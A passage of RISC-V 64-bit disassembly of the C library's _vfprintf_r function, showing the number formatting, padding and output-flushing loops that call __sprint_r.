   1158a:	421090ef          	jal	ra,1b1aa <__eqtf2>
   1158e:	68a2                	ld	a7,8(sp)
   11590:	7782                	ld	a5,32(sp)
   11592:	010c0313          	addi	t1,s8,16
   11596:	0008861b          	sext.w	a2,a7
   1159a:	fff7869b          	addiw	a3,a5,-1
   1159e:	2e050963          	beqz	a0,11890 <_vfprintf_r+0xf1c>
   115a2:	9db6                	add	s11,s11,a3
   115a4:	001c8813          	addi	a6,s9,1
   115a8:	00dc3423          	sd	a3,8(s8)
   115ac:	010c3023          	sd	a6,0(s8)
   115b0:	f26e                	sd	s11,288(sp)
   115b2:	11112c23          	sw	a7,280(sp)
   115b6:	469d                	li	a3,7
   115b8:	44c6c763          	blt	a3,a2,11a06 <_vfprintf_r+0x1092>
   115bc:	7742                	ld	a4,48(sp)
   115be:	020c0693          	addi	a3,s8,32
   115c2:	8c1a                	mv	s8,t1
   115c4:	0027061b          	addiw	a2,a4,2
   115c8:	8336                	mv	t1,a3
   115ca:	668a                	ld	a3,128(sp)
   115cc:	1998                	addi	a4,sp,240
   115ce:	00ec3023          	sd	a4,0(s8)
   115d2:	00dd87b3          	add	a5,s11,a3
   115d6:	00dc3423          	sd	a3,8(s8)
   115da:	f23e                	sd	a5,288(sp)
   115dc:	10c12c23          	sw	a2,280(sp)
   115e0:	471d                	li	a4,7
   115e2:	dec75963          	bge	a4,a2,10bd4 <_vfprintf_r+0x260>
   115e6:	bc2d                	j	11020 <_vfprintf_r+0x6ac>
   115e8:	4705                	li	a4,1
   115ea:	8826                	mv	a6,s1
   115ec:	aae790e3          	bne	a5,a4,1108c <_vfprintf_r+0x718>
   115f0:	47a5                	li	a5,9
   115f2:	3737e163          	bltu	a5,s3,11954 <_vfprintf_r+0xfe0>
   115f6:	0309899b          	addiw	s3,s3,48
   115fa:	193105a3          	sb	s3,395(sp)
   115fe:	84c2                	mv	s1,a6
   11600:	4c05                	li	s8,1
   11602:	18b10c93          	addi	s9,sp,395
   11606:	ed6ff06f          	j	10cdc <_vfprintf_r+0x368>
   1160a:	11812703          	lw	a4,280(sp)
   1160e:	0000b897          	auipc	a7,0xb
   11612:	2aa88893          	addi	a7,a7,682 # 1c8b8 <blanks.4520>
   11616:	439d                	li	t2,7
   11618:	00dd4663          	blt	s10,a3,11624 <_vfprintf_r+0xcb0>
   1161c:	a889                	j	1166e <_vfprintf_r+0xcfa>
   1161e:	36c1                	addiw	a3,a3,-16
   11620:	04dd5763          	bge	s10,a3,1166e <_vfprintf_r+0xcfa>
   11624:	2705                	addiw	a4,a4,1
   11626:	07c1                	addi	a5,a5,16
   11628:	01133023          	sd	a7,0(t1)
   1162c:	01a33423          	sd	s10,8(t1)
   11630:	f23e                	sd	a5,288(sp)
   11632:	10e12c23          	sw	a4,280(sp)
   11636:	0341                	addi	t1,t1,16
   11638:	fee3d3e3          	bge	t2,a4,1161e <_vfprintf_r+0xcaa>
   1163c:	0a10                	addi	a2,sp,272
   1163e:	85d2                	mv	a1,s4
   11640:	8556                	mv	a0,s5
   11642:	e4c6                	sd	a7,72(sp)
   11644:	e0f6                	sd	t4,64(sp)
   11646:	fc7e                	sd	t6,56(sp)
   11648:	f816                	sd	t0,48(sp)
   1164a:	e436                	sd	a3,8(sp)
   1164c:	0e7070ef          	jal	ra,18f32 <__sprint_r>
   11650:	ec0512e3          	bnez	a0,11514 <_vfprintf_r+0xba0>
   11654:	66a2                	ld	a3,8(sp)
   11656:	7792                	ld	a5,288(sp)
   11658:	11812703          	lw	a4,280(sp)
   1165c:	36c1                	addiw	a3,a3,-16
   1165e:	68a6                	ld	a7,72(sp)
   11660:	6e86                	ld	t4,64(sp)
   11662:	7fe2                	ld	t6,56(sp)
   11664:	72c2                	ld	t0,48(sp)
   11666:	835e                	mv	t1,s7
   11668:	439d                	li	t2,7
   1166a:	fadd4de3          	blt	s10,a3,11624 <_vfprintf_r+0xcb0>
   1166e:	2705                	addiw	a4,a4,1
   11670:	97b6                	add	a5,a5,a3
   11672:	00d33423          	sd	a3,8(t1)
   11676:	01133023          	sd	a7,0(t1)
   1167a:	0007069b          	sext.w	a3,a4
   1167e:	10e12c23          	sw	a4,280(sp)
   11682:	f23e                	sd	a5,288(sp)
   11684:	471d                	li	a4,7
   11686:	0341                	addi	t1,t1,16
   11688:	cad75d63          	bge	a4,a3,10b42 <_vfprintf_r+0x1ce>
   1168c:	0a10                	addi	a2,sp,272
   1168e:	85d2                	mv	a1,s4
   11690:	8556                	mv	a0,s5
   11692:	fc76                	sd	t4,56(sp)
   11694:	f87e                	sd	t6,48(sp)
   11696:	e416                	sd	t0,8(sp)
   11698:	09b070ef          	jal	ra,18f32 <__sprint_r>
   1169c:	e6051ce3          	bnez	a0,11514 <_vfprintf_r+0xba0>
   116a0:	7792                	ld	a5,288(sp)
   116a2:	7ee2                	ld	t4,56(sp)
   116a4:	7fc2                	ld	t6,48(sp)
   116a6:	62a2                	ld	t0,8(sp)
   116a8:	835e                	mv	t1,s7
   116aa:	c98ff06f          	j	10b42 <_vfprintf_r+0x1ce>
   116ae:	0a10                	addi	a2,sp,272
   116b0:	85d2                	mv	a1,s4
   116b2:	8556                	mv	a0,s5
   116b4:	f876                	sd	t4,48(sp)
   116b6:	e47e                	sd	t6,8(sp)
   116b8:	07b070ef          	jal	ra,18f32 <__sprint_r>
   116bc:	e4051ce3          	bnez	a0,11514 <_vfprintf_r+0xba0>
   116c0:	7792                	ld	a5,288(sp)
   116c2:	7ec2                	ld	t4,48(sp)
   116c4:	6fa2                	ld	t6,8(sp)
   116c6:	835e                	mv	t1,s7
   116c8:	cd2ff06f          	j	10b9a <_vfprintf_r+0x226>
   116cc:	11812703          	lw	a4,280(sp)
   116d0:	0000b897          	auipc	a7,0xb
   116d4:	1e888893          	addi	a7,a7,488 # 1c8b8 <blanks.4520>
   116d8:	4c1d                	li	s8,7
   116da:	009d4663          	blt	s10,s1,116e6 <_vfprintf_r+0xd72>
   116de:	a081                	j	1171e <_vfprintf_r+0xdaa>
   116e0:	34c1                	addiw	s1,s1,-16
   116e2:	029d5e63          	bge	s10,s1,1171e <_vfprintf_r+0xdaa>
   116e6:	2705                	addiw	a4,a4,1
   116e8:	07c1                	addi	a5,a5,16
   116ea:	01133023          	sd	a7,0(t1)
   116ee:	01a33423          	sd	s10,8(t1)
   116f2:	f23e                	sd	a5,288(sp)
   116f4:	10e12c23          	sw	a4,280(sp)
   116f8:	0341                	addi	t1,t1,16
   116fa:	feec53e3          	bge	s8,a4,116e0 <_vfprintf_r+0xd6c>
   116fe:	0a10                	addi	a2,sp,272
   11700:	85d2                	mv	a1,s4
   11702:	8556                	mv	a0,s5
   11704:	e446                	sd	a7,8(sp)
   11706:	02d070ef          	jal	ra,18f32 <__sprint_r>
   1170a:	e00515e3          	bnez	a0,11514 <_vfprintf_r+0xba0>
   1170e:	34c1                	addiw	s1,s1,-16
   11710:	7792                	ld	a5,288(sp)
   11712:	11812703          	lw	a4,280(sp)
   11716:	68a2                	ld	a7,8(sp)
   11718:	835e                	mv	t1,s7
   1171a:	fc9d46e3          	blt	s10,s1,116e6 <_vfprintf_r+0xd72>
   1171e:	0017069b          	addiw	a3,a4,1
   11722:	97a6                	add	a5,a5,s1
   11724:	01133023          	sd	a7,0(t1)
   11728:	00933423          	sd	s1,8(t1)
   1172c:	f23e                	sd	a5,288(sp)
   1172e:	10d12c23          	sw	a3,280(sp)
   11732:	471d                	li	a4,7
   11734:	cad75663          	bge	a4,a3,10be0 <_vfprintf_r+0x26c>
   11738:	0a10                	addi	a2,sp,272
   1173a:	85d2                	mv	a1,s4
   1173c:	8556                	mv	a0,s5
   1173e:	7f4070ef          	jal	ra,18f32 <__sprint_r>
   11742:	dc0519e3          	bnez	a0,11514 <_vfprintf_r+0xba0>
   11746:	7792                	ld	a5,288(sp)
   11748:	c98ff06f          	j	10be0 <_vfprintf_r+0x26c>
   1174c:	562e                	lw	a2,232(sp)
   1174e:	3ec05e63          	blez	a2,11b4a <_vfprintf_r+0x11d6>
   11752:	6766                	ld	a4,88(sp)
   11754:	7682                	ld	a3,32(sp)
   11756:	00070c1b          	sext.w	s8,a4
   1175a:	28e6c263          	blt	a3,a4,119de <_vfprintf_r+0x106a>
   1175e:	03805263          	blez	s8,11782 <_vfprintf_r+0xe0e>
   11762:	11812703          	lw	a4,280(sp)
   11766:	97e2                	add	a5,a5,s8
   11768:	01933023          	sd	s9,0(t1)
   1176c:	0017069b          	addiw	a3,a4,1
   11770:	01833423          	sd	s8,8(t1)
   11774:	f23e                	sd	a5,288(sp)
   11776:	10d12c23          	sw	a3,280(sp)
   1177a:	471d                	li	a4,7
   1177c:	0341                	addi	t1,t1,16
   1177e:	6ed74d63          	blt	a4,a3,11e78 <_vfprintf_r+0x1504>
   11782:	fffc4713          	not	a4,s8
   11786:	977d                	srai	a4,a4,0x3f
   11788:	00ec7c33          	and	s8,s8,a4
   1178c:	6766                	ld	a4,88(sp)
   1178e:	41870c3b          	subw	s8,a4,s8
   11792:	33804c63          	bgtz	s8,11aca <_vfprintf_r+0x1156>
   11796:	66e6                	ld	a3,88(sp)
   11798:	4004f713          	andi	a4,s1,1024
   1179c:	00dc8db3          	add	s11,s9,a3
   117a0:	54071f63          	bnez	a4,11cfe <_vfprintf_r+0x138a>
   117a4:	572e                	lw	a4,232(sp)
   117a6:	7682                	ld	a3,32(sp)
   117a8:	00d74663          	blt	a4,a3,117b4 <_vfprintf_r+0xe40>
   117ac:	0014f693          	andi	a3,s1,1
   117b0:	6e068063          	beqz	a3,11e90 <_vfprintf_r+0x151c>
   117b4:	76e6                	ld	a3,120(sp)
   117b6:	7646                	ld	a2,112(sp)
   117b8:	0341                	addi	t1,t1,16
   117ba:	fed33823          	sd	a3,-16(t1)
   117be:	11812683          	lw	a3,280(sp)
   117c2:	97b2                	add	a5,a5,a2
   117c4:	fec33c23          	sd	a2,-8(t1)
   117c8:	2685                	addiw	a3,a3,1
   117ca:	0006861b          	sext.w	a2,a3
   117ce:	10d12c23          	sw	a3,280(sp)
   117d2:	f23e                	sd	a5,288(sp)
   117d4:	469d                	li	a3,7
   117d6:	22c6c7e3          	blt	a3,a2,12204 <_vfprintf_r+0x1890>
   117da:	7682                	ld	a3,32(sp)
   117dc:	00dc8633          	add	a2,s9,a3
   117e0:	40e6873b          	subw	a4,a3,a4
   117e4:	41b6063b          	subw	a2,a2,s11
   117e8:	0007069b          	sext.w	a3,a4
   117ec:	00d65363          	bge	a2,a3,117f2 <_vfprintf_r+0xe7e>
   117f0:	8732                	mv	a4,a2
   117f2:	00070c9b          	sext.w	s9,a4
   117f6:	03905263          	blez	s9,1181a <_vfprintf_r+0xea6>
   117fa:	11812603          	lw	a2,280(sp)
   117fe:	97e6                	add	a5,a5,s9
   11800:	01b33023          	sd	s11,0(t1)
   11804:	0016059b          	addiw	a1,a2,1
   11808:	01933423          	sd	s9,8(t1)
   1180c:	f23e                	sd	a5,288(sp)
   1180e:	10b12c23          	sw	a1,280(sp)
   11812:	461d                	li	a2,7
   11814:	0341                	addi	t1,t1,16
   11816:	26b644e3          	blt	a2,a1,1227e <_vfprintf_r+0x190a>
   1181a:	fffccc13          	not	s8,s9
   1181e:	43fc5c13          	srai	s8,s8,0x3f
   11822:	018cfc33          	and	s8,s9,s8
   11826:	41868c3b          	subw	s8,a3,s8
   1182a:	bb805563          	blez	s8,10bd4 <_vfprintf_r+0x260>
   1182e:	11812703          	lw	a4,280(sp)
   11832:	3b8d5563          	bge	s10,s8,11bdc <_vfprintf_r+0x1268>
   11836:	4c9d                	li	s9,7
   11838:	a021                	j	11840 <_vfprintf_r+0xecc>
   1183a:	3c41                	addiw	s8,s8,-16
   1183c:	3b8d5063          	bge	s10,s8,11bdc <_vfprintf_r+0x1268>
   11840:	2705                	addiw	a4,a4,1
   11842:	07c1                	addi	a5,a5,16
   11844:	01233023          	sd	s2,0(t1)
   11848:	01a33423          	sd	s10,8(t1)
   1184c:	f23e                	sd	a5,288(sp)
   1184e:	10e12c23          	sw	a4,280(sp)
   11852:	0341                	addi	t1,t1,16
   11854:	feecd3e3          	bge	s9,a4,1183a <_vfprintf_r+0xec6>
   11858:	0a10                	addi	a2,sp,272
   1185a:	85d2                	mv	a1,s4
   1185c:	8556                	mv	a0,s5
   1185e:	6d4070ef          	jal	ra,18f32 <__sprint_r>
   11862:	ca0519e3          	bnez	a0,11514 <_vfprintf_r+0xba0>
   11866:	7792                	ld	a5,288(sp)
   11868:	11812703          	lw	a4,280(sp)
   1186c:	835e                	mv	t1,s7
   1186e:	b7f1                	j	1183a <_vfprintf_r+0xec6>
   11870:	0014f513          	andi	a0,s1,1
   11874:	cc0518e3          	bnez	a0,11544 <_vfprintf_r+0xbd0>
   11878:	00b33423          	sd	a1,8(t1)
   1187c:	f26e                	sd	s11,288(sp)
   1187e:	10e12c23          	sw	a4,280(sp)
   11882:	469d                	li	a3,7
   11884:	18e6c163          	blt	a3,a4,11a06 <_vfprintf_r+0x1092>
   11888:	2609                	addiw	a2,a2,2
   1188a:	02030313          	addi	t1,t1,32
   1188e:	bb35                	j	115ca <_vfprintf_r+0xc56>
   11890:	d2d05de3          	blez	a3,115ca <_vfprintf_r+0xc56>
   11894:	4cdd50e3          	bge	s10,a3,12554 <_vfprintf_r+0x1be0>
   11898:	4c9d                	li	s9,7
   1189a:	a031                	j	118a6 <_vfprintf_r+0xf32>
   1189c:	36c1                	addiw	a3,a3,-16
   1189e:	14dd5563          	bge	s10,a3,119e8 <_vfprintf_r+0x1074>
   118a2:	0017089b          	addiw	a7,a4,1
   118a6:	0dc1                	addi	s11,s11,16
   118a8:	012c3023          	sd	s2,0(s8)
   118ac:	01ac3423          	sd	s10,8(s8)
   118b0:	f26e                	sd	s11,288(sp)
   118b2:	0008871b          	sext.w	a4,a7
   118b6:	11112c23          	sw	a7,280(sp)
   118ba:	0c41                	addi	s8,s8,16
   118bc:	feecd0e3          	bge	s9,a4,1189c <_vfprintf_r+0xf28>
   118c0:	0a10                	addi	a2,sp,272
   118c2:	85d2                	mv	a1,s4
   118c4:	8556                	mv	a0,s5
   118c6:	e436                	sd	a3,8(sp)
   118c8:	66a070ef          	jal	ra,18f32 <__sprint_r>
   118cc:	c40514e3          	bnez	a0,11514 <_vfprintf_r+0xba0>
   118d0:	7d92                	ld	s11,288(sp)
   118d2:	11812703          	lw	a4,280(sp)
   118d6:	66a2                	ld	a3,8(sp)
   118d8:	8c5e                	mv	s8,s7
   118da:	b7c9                	j	1189c <_vfprintf_r+0xf28>
   118dc:	01087793          	andi	a5,a6,16
   118e0:	eb8d                	bnez	a5,11912 <_vfprintf_r+0xf9e>
   118e2:	66c2                	ld	a3,16(sp)
   118e4:	04087793          	andi	a5,a6,64
   118e8:	0006a983          	lw	s3,0(a3)
   118ec:	36078c63          	beqz	a5,11c64 <_vfprintf_r+0x12f0>
   118f0:	19c2                	slli	s3,s3,0x30
   118f2:	0309d993          	srli	s3,s3,0x30
   118f6:	e83a                	sd	a4,16(sp)
   118f8:	4785                	li	a5,1
   118fa:	c26ff06f          	j	10d20 <_vfprintf_r+0x3ac>
   118fe:	0014f713          	andi	a4,s1,1
   11902:	ac070963          	beqz	a4,10bd4 <_vfprintf_r+0x260>
   11906:	b461                	j	1138e <_vfprintf_r+0xa1a>
   11908:	6782                	ld	a5,0(sp)
   1190a:	8ca2                	mv	s9,s0
   1190c:	e31c                	sd	a5,0(a4)
   1190e:	af8ff06f          	j	10c06 <_vfprintf_r+0x292>
   11912:	67c2                	ld	a5,16(sp)
   11914:	e83a                	sd	a4,16(sp)
   11916:	0007b983          	ld	s3,0(a5)
   1191a:	4785                	li	a5,1
   1191c:	c04ff06f          	j	10d20 <_vfprintf_r+0x3ac>
   11920:	67c2                	ld	a5,16(sp)
   11922:	639c                	ld	a5,0(a5)
   11924:	89be                	mv	s3,a5
   11926:	b90ff06f          	j	10cb6 <_vfprintf_r+0x342>
   1192a:	67c2                	ld	a5,16(sp)
   1192c:	0007b983          	ld	s3,0(a5)
   11930:	be4ff06f          	j	10d14 <_vfprintf_r+0x3a0>
   11934:	67c2                	ld	a5,16(sp)
   11936:	07bd                	addi	a5,a5,15
   11938:	9bc1                	andi	a5,a5,-16
   1193a:	6394                	ld	a3,0(a5)
   1193c:	6798                	ld	a4,8(a5)
   1193e:	07c1                	addi	a5,a5,16
   11940:	e83e                	sd	a5,16(sp)
   11942:	e236                	sd	a3,256(sp)
   11944:	e63a                	sd	a4,264(sp)
   11946:	c50ff06f          	j	10d96 <_vfprintf_r+0x422>
   1194a:	e83a                	sd	a4,16(sp)
   1194c:	47a5                	li	a5,9
   1194e:	8826                	mv	a6,s1
   11950:	cb37f3e3          	bgeu	a5,s3,115f6 <_vfprintf_r+0xc82>
   11954:	40087793          	andi	a5,a6,1024
   11958:	18c10c13          	addi	s8,sp,396
   1195c:	2781                	sext.w	a5,a5
   1195e:	f002                	sd	zero,32(sp)
   11960:	85e2                	mv	a1,s8
   11962:	44a9                	li	s1,10
   11964:	4725                	li	a4,9
   11966:	0ff00693          	li	a3,255
   1196a:	a039                	j	11978 <_vfprintf_r+0x1004>
   1196c:	0299d633          	divu	a2,s3,s1
   11970:	9d3771e3          	bgeu	a4,s3,11332 <_vfprintf_r+0x9be>
   11974:	89b2                	mv	s3,a2
   11976:	85e6                	mv	a1,s9
   11978:	7502                	ld	a0,32(sp)
   1197a:	fff58c93          	addi	s9,a1,-1
   1197e:	2505                	addiw	a0,a0,1
   11980:	f02a                	sd	a0,32(sp)
   11982:	0299f633          	remu	a2,s3,s1
   11986:	0306061b          	addiw	a2,a2,48
   1198a:	fec58fa3          	sb	a2,-1(a1)
   1198e:	dff9                	beqz	a5,1196c <_vfprintf_r+0xff8>
   11990:	7626                	ld	a2,104(sp)
   11992:	00064603          	lbu	a2,0(a2)
   11996:	fcc51be3          	bne	a0,a2,1196c <_vfprintf_r+0xff8>
   1199a:	fcd609e3          	beq	a2,a3,1196c <_vfprintf_r+0xff8>
   1199e:	99377ae3          	bgeu	a4,s3,11332 <_vfprintf_r+0x9be>
   119a2:	fc3e                	sd	a5,56(sp)
   119a4:	67aa                	ld	a5,136(sp)
   119a6:	65ca                	ld	a1,144(sp)
   119a8:	f81a                	sd	t1,48(sp)
   119aa:	40fc8cb3          	sub	s9,s9,a5
   119ae:	863e                	mv	a2,a5
   119b0:	8566                	mv	a0,s9
   119b2:	ec76                	sd	t4,24(sp)
   119b4:	e442                	sd	a6,8(sp)
   119b6:	07b050ef          	jal	ra,17230 <strncpy>
   119ba:	77a6                	ld	a5,104(sp)
   119bc:	0299d633          	divu	a2,s3,s1
   119c0:	6822                	ld	a6,8(sp)
   119c2:	0017c583          	lbu	a1,1(a5)
   119c6:	6ee2                	ld	t4,24(sp)
   119c8:	7342                	ld	t1,48(sp)
   119ca:	00b035b3          	snez	a1,a1
   119ce:	97ae                	add	a5,a5,a1
   119d0:	f4be                	sd	a5,104(sp)
   119d2:	f002                	sd	zero,32(sp)
   119d4:	77e2                	ld	a5,56(sp)
   119d6:	4725                	li	a4,9
   119d8:	0ff00693          	li	a3,255
   119dc:	bf61                	j	11974 <_vfprintf_r+0x1000>
   119de:	00068c1b          	sext.w	s8,a3
   119e2:	d98040e3          	bgtz	s8,11762 <_vfprintf_r+0xdee>
   119e6:	bb71                	j	11782 <_vfprintf_r+0xe0e>
   119e8:	0017061b          	addiw	a2,a4,1
   119ec:	010c0713          	addi	a4,s8,16
   119f0:	9db6                	add	s11,s11,a3
   119f2:	00dc3423          	sd	a3,8(s8)
   119f6:	012c3023          	sd	s2,0(s8)
   119fa:	f26e                	sd	s11,288(sp)
   119fc:	10c12c23          	sw	a2,280(sp)
   11a00:	469d                	li	a3,7
   11a02:	44c6d563          	bge	a3,a2,11e4c <_vfprintf_r+0x14d8>
   11a06:	0a10                	addi	a2,sp,272
   11a08:	85d2                	mv	a1,s4
   11a0a:	8556                	mv	a0,s5
   11a0c:	526070ef          	jal	ra,18f32 <__sprint_r>
   11a10:	b00512e3          	bnez	a0,11514 <_vfprintf_r+0xba0>
   11a14:	11812603          	lw	a2,280(sp)
   11a18:	7d92                	ld	s11,288(sp)
   11a1a:	1a010313          	addi	t1,sp,416
   11a1e:	2605                	addiw	a2,a2,1
   11a20:	8c5e                	mv	s8,s7
   11a22:	b665                	j	115ca <_vfprintf_r+0xc56>
   11a24:	8826                	mv	a6,s1
   11a26:	825ff06f          	j	1124a <_vfprintf_r+0x8d6>
   11a2a:	0000b797          	auipc	a5,0xb
   11a2e:	cf678793          	addi	a5,a5,-778 # 1c720 <__clzdi2+0x1a0>
   11a32:	f43e                	sd	a5,40(sp)
   11a34:	66c2                	ld	a3,16(sp)
   11a36:	0204f793          	andi	a5,s1,32
   11a3a:	00868713          	addi	a4,a3,8
   11a3e:	c7f9                	beqz	a5,11b0c <_vfprintf_r+0x1198>
   11a40:	0006b983          	ld	s3,0(a3)
   11a44:	0014f793          	andi	a5,s1,1
   11a48:	cf81                	beqz	a5,11a60 <_vfprintf_r+0x10ec>
   11a4a:	00098b63          	beqz	s3,11a60 <_vfprintf_r+0x10ec>
   11a4e:	0024e493          	ori	s1,s1,2
   11a52:	03000793          	li	a5,48
   11a56:	0ef10023          	sb	a5,224(sp)
   11a5a:	0fb100a3          	sb	s11,225(sp)
   11a5e:	2481                	sext.w	s1,s1
   11a60:	bff4f493          	andi	s1,s1,-1025
   11a64:	0004881b          	sext.w	a6,s1
   11a68:	e83a                	sd	a4,16(sp)
   11a6a:	4789                	li	a5,2
   11a6c:	ab4ff06f          	j	10d20 <_vfprintf_r+0x3ac>
   11a70:	2004e493          	ori	s1,s1,512
   11a74:	00144f03          	lbu	t5,1(s0)
   11a78:	2481                	sext.w	s1,s1
   11a7a:	0405                	addi	s0,s0,1
   11a7c:	82cff06f          	j	10aa8 <_vfprintf_r+0x134>
   11a80:	0204e493          	ori	s1,s1,32
   11a84:	00144f03          	lbu	t5,1(s0)
   11a88:	2481                	sext.w	s1,s1
   11a8a:	0405                	addi	s0,s0,1
   11a8c:	81cff06f          	j	10aa8 <_vfprintf_r+0x134>
   11a90:	0a10                	addi	a2,sp,272
   11a92:	85d2                	mv	a1,s4
   11a94:	8556                	mv	a0,s5
   11a96:	49c070ef          	jal	ra,18f32 <__sprint_r>
   11a9a:	a6051de3          	bnez	a0,11514 <_vfprintf_r+0xba0>
   11a9e:	7792                	ld	a5,288(sp)
   11aa0:	835e                	mv	t1,s7
   11aa2:	ba09                	j	113b4 <_vfprintf_r+0xa40>
   11aa4:	0000b797          	auipc	a5,0xb
   11aa8:	c6478793          	addi	a5,a5,-924 # 1c708 <__clzdi2+0x188>
   11aac:	f43e                	sd	a5,40(sp)
   11aae:	b759                	j	11a34 <_vfprintf_r+0x10c0>
   11ab0:	4799                	li	a5,6
   11ab2:	000e8c1b          	sext.w	s8,t4
   11ab6:	3dd7eb63          	bltu	a5,t4,11e8c <_vfprintf_r+0x1518>
   11aba:	89e2                	mv	s3,s8
   11abc:	e836                	sd	a3,16(sp)
   11abe:	0000bc97          	auipc	s9,0xb
   11ac2:	c7ac8c93          	addi	s9,s9,-902 # 1c738 <__clzdi2+0x1b8>
   11ac6:	854ff06f          	j	10b1a <_vfprintf_r+0x1a6>
   11aca:	11812703          	lw	a4,280(sp)
   11ace:	218d5063          	bge	s10,s8,11cce <_vfprintf_r+0x135a>
   11ad2:	4d9d                	li	s11,7
   11ad4:	a021                	j	11adc <_vfprintf_r+0x1168>
   11ad6:	3c41                	addiw	s8,s8,-16
   11ad8:	1f8d5b63          	bge	s10,s8,11cce <_vfprintf_r+0x135a>
   11adc:	2705                	addiw	a4,a4,1
   11ade:	07c1                	addi	a5,a5,16
   11ae0:	01233023          	sd	s2,0(t1)
   11ae4:	01a33423          	sd	s10,8(t1)
   11ae8:	f23e                	sd	a5,288(sp)
   11aea:	10e12c23          	sw	a4,280(sp)
   11aee:	0341                	addi	t1,t1,16
   11af0:	feedd3e3          	bge	s11,a4,11ad6 <_vfprintf_r+0x1162>
   11af4:	0a10                	addi	a2,sp,272
   11af6:	85d2                	mv	a1,s4
   11af8:	8556                	mv	a0,s5
   11afa:	438070ef          	jal	ra,18f32 <__sprint_r>
   11afe:	a0051be3          	bnez	a0,11514 <_vfprintf_r+0xba0>
   11b02:	7792                	ld	a5,288(sp)
   11b04:	11812703          	lw	a4,280(sp)
   11b08:	835e                	mv	t1,s7
   11b0a:	b7f1                	j	11ad6 <_vfprintf_r+0x1162>
   11b0c:	0104f793          	andi	a5,s1,16
   11b10:	c3cd                	beqz	a5,11bb2 <_vfprintf_r+0x123e>
   11b12:	67c2                	ld	a5,16(sp)
   11b14:	0007b983          	ld	s3,0(a5)
   11b18:	b735                	j	11a44 <_vfprintf_r+0x10d0>
   11b1a:	0a10                	addi	a2,sp,272
   11b1c:	85d2                	mv	a1,s4
   11b1e:	8556                	mv	a0,s5
   11b20:	412070ef          	jal	ra,18f32 <__sprint_r>
   11b24:	9e0518e3          	bnez	a0,11514 <_vfprintf_r+0xba0>
   11b28:	7d92                	ld	s11,288(sp)
   11b2a:	11812703          	lw	a4,280(sp)
   11b2e:	8c5e                	mv	s8,s7
   11b30:	b41d                	j	11556 <_vfprintf_r+0xbe2>
   11b32:	0a10                	addi	a2,sp,272
   11b34:	85d2                	mv	a1,s4
   11b36:	8556                	mv	a0,s5
   11b38:	3fa070ef          	jal	ra,18f32 <__sprint_r>
   11b3c:	9c051ce3          	bnez	a0,11514 <_vfprintf_r+0xba0>
   11b40:	7d92                	ld	s11,288(sp)
   11b42:	11812703          	lw	a4,280(sp)
   11b46:	8c5e                	mv	s8,s7
   11b48:	bc0d                	j	1157a <_vfprintf_r+0xc06>
   11b4a:	11812703          	lw	a4,280(sp)
   11b4e:	0000b697          	auipc	a3,0xb
   11b52:	bf268693          	addi	a3,a3,-1038 # 1c740 <__clzdi2+0x1c0>
   11b56:	00d33023          	sd	a3,0(t1)
   11b5a:	2705                	addiw	a4,a4,1
   11b5c:	4685                	li	a3,1
   11b5e:	0785                	addi	a5,a5,1
   11b60:	00d33423          	sd	a3,8(t1)
   11b64:	10e12c23          	sw	a4,280(sp)
   11b68:	0007069b          	sext.w	a3,a4
   11b6c:	f23e                	sd	a5,288(sp)
   11b6e:	471d                	li	a4,7
   11b70:	0341                	addi	t1,t1,16
   11b72:	2ed74363          	blt	a4,a3,11e58 <_vfprintf_r+0x14e4>
   11b76:	c4061363          	bnez	a2,10fbc <_vfprintf_r+0x648>
   11b7a:	7682                	ld	a3,32(sp)
   11b7c:	0014f713          	andi	a4,s1,1
   11b80:	8f55                	or	a4,a4,a3
   11b82:	e319                	bnez	a4,11b88 <_vfprintf_r+0x1214>
   11b84:	850ff06f          	j	10bd4 <_vfprintf_r+0x260>
   11b88:	76e6                	ld	a3,120(sp)
   11b8a:	7746                	ld	a4,112(sp)
   11b8c:	00d33023          	sd	a3,0(t1)
   11b90:	11812683          	lw	a3,280(sp)
   11b94:	97ba                	add	a5,a5,a4
   11b96:	00e33423          	sd	a4,8(t1)
   11b9a:	2685                	addiw	a3,a3,1
   11b9c:	0006871b          	sext.w	a4,a3
   11ba0:	10d12c23          	sw	a3,280(sp)
   11ba4:	f23e                	sd	a5,288(sp)
   11ba6:	469d                	li	a3,7
   11ba8:	c2e6cd63          	blt	a3,a4,10fe2 <_vfprintf_r+0x66e>
   11bac:	0341                	addi	t1,t1,16
   11bae:	c54ff06f          	j	11002 <_vfprintf_r+0x68e>
   11bb2:	66c2                	ld	a3,16(sp)
   11bb4:	0404f793          	andi	a5,s1,64
   11bb8:	0006a983          	lw	s3,0(a3)
   11bbc:	cbe1                	beqz	a5,11c8c <_vfprintf_r+0x1318>
   11bbe:	19c2                	slli	s3,s3,0x30
   11bc0:	0309d993          	srli	s3,s3,0x30
   11bc4:	b541                	j	11a44 <_vfprintf_r+0x10d0>
   11bc6:	0a10                	addi	a2,sp,272
   11bc8:	85d2                	mv	a1,s4
   11bca:	8556                	mv	a0,s5
   11bcc:	366070ef          	jal	ra,18f32 <__sprint_r>
   11bd0:	940512e3          	bnez	a0,11514 <_vfprintf_r+0xba0>
   11bd4:	7792                	ld	a5,288(sp)
   11bd6:	835e                	mv	t1,s7
   11bd8:	faeff06f          	j	11386 <_vfprintf_r+0xa12>
   11bdc:	0017069b          	addiw	a3,a4,1
   11be0:	8736                	mv	a4,a3
   11be2:	97e2                	add	a5,a5,s8
   11be4:	01233023          	sd	s2,0(t1)
   11be8:	fdbfe06f          	j	10bc2 <_vfprintf_r+0x24e>
   11bec:	6512                	ld	a0,256(sp)
   11bee:	65b2                	ld	a1,264(sp)
   11bf0:	4601                	li	a2,0
   11bf2:	4681                	li	a3,0
   11bf4:	e41a                	sd	t1,8(sp)
   11bf6:	6f0090ef          	jal	ra,1b2e6 <__letf2>
   11bfa:	6322                	ld	t1,8(sp)
   11bfc:	54054763          	bltz	a0,1214a <_vfprintf_r+0x17d6>
   11c00:	0df14783          	lbu	a5,223(sp)
   11c04:	04700713          	li	a4,71
   11c08:	0000bc97          	auipc	s9,0xb
   11c0c:	ae0c8c93          	addi	s9,s9,-1312 # 1c6e8 <__clzdi2+0x168>
   11c10:	25b74f63          	blt	a4,s11,11e6e <_vfprintf_r+0x14fa>
   11c14:	f7f4f493          	andi	s1,s1,-129
   11c18:	ec02                	sd	zero,24(sp)
   11c1a:	e882                	sd	zero,80(sp)
   11c1c:	f082                	sd	zero,96(sp)
   11c1e:	ec82                	sd	zero,88(sp)
   11c20:	2481                	sext.w	s1,s1
   11c22:	498d                	li	s3,3
   11c24:	4c0d                	li	s8,3
   11c26:	4e81                	li	t4,0
   11c28:	8c079863          	bnez	a5,10cf8 <_vfprintf_r+0x384>
